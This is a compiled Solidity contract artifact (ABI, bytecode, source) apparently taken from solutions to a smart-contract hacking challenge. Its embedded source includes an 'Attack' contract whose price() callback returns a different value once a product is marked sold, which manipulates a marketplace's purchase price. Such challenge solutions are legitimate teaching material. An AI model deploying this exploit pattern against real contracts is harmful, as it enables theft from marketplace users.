{
  "contractName": "Seller",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_address",
          "type": "address"
        }
      ],
      "name": "run",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50610262806100206000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063522bb70414610030575b600080fd5b61004a600480360381019061004591906100e1565b61004c565b005b8073ffffffffffffffffffffffffffffffffffffffff1663125b0b34670de0b6b3a76400006729a2241af62c00006040518363ffffffff1660e01b8152600401610097929190610168565b600060405180830381600087803b1580156100b157600080fd5b505af11580156100c5573d6000803e3d6000fd5b5050505050565b6000813590506100db81610215565b92915050565b6000602082840312156100f357600080fd5b6000610101848285016100cc565b91505092915050565b610113816101f1565b82525050565b61012281610203565b82525050565b6000610135600c836101a4565b91507f676f6f642070726f6475637400000000000000000000000000000000000000006000830152602082019050919050565b6000606082019050818103600083015261018181610128565b9050610190602083018561010a565b61019d6040830184610119565b9392505050565b600082825260208201905092915050565b60006101c0826101c7565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006101fc826101e7565b9050919050565b600061020e826101e7565b9050919050565b61021e816101b5565b811461022957600080fd5b5056fea264697066735822122009b00d0d4faf8c0d0e93e4682c004a5d243d4fd0b1ad03e07cac8261dd5e82d164736f6c63430008000033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\n\npragma solidity >= 0.8.0;\n\ninterface ProductI {\n    struct Product {\n        string description;\n        address seller;\n        address buyer;\n        uint256 auctionPrice;\n        uint256 directBuyPrice;\n        uint256 finalPrice;\n        uint256 timeLimitForAuction;\n        bool isSold;\n    }\n}\n\ninterface BlockScout24Buyer is ProductI {\n    function price(Product calldata _product) external returns (uint256);\n}\n\ninterface BlockScout24 is ProductI {\n    function buyProduct(uint256 _productId) external;\n    function addProduct(string calldata _description, uint256 _auctionPrice, uint256 _directBuyPrice) external;\n}\n\n\ncontract Seller {\n    function run(address _address) external {\n        BlockScout24(_address).addProduct(\"good product\", 1 ether, 3 ether);\n    }\n}\n\ncontract Attack is BlockScout24Buyer {\n    function run(address _address) external {\n        BlockScout24(_address).buyProduct(0);\n    }\n    \n    function price(Product calldata _product) external pure override returns (uint256) {\n        if (!_product.isSold) {\n            return _product.directBuyPrice;\n        } else {\n            return 0;\n        }\n    }\n}",
  "sourcePath": "/Users/simonperriard/Documents/Personnal/HackTheContract_Solutions/contracts/attacks/08.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.0+commit.c7dfd78e.Emscripten.clang"
  },
  "schemaVersion": "3.4.2",
  "updatedAt": "2021-08-18T07:32:40.521Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}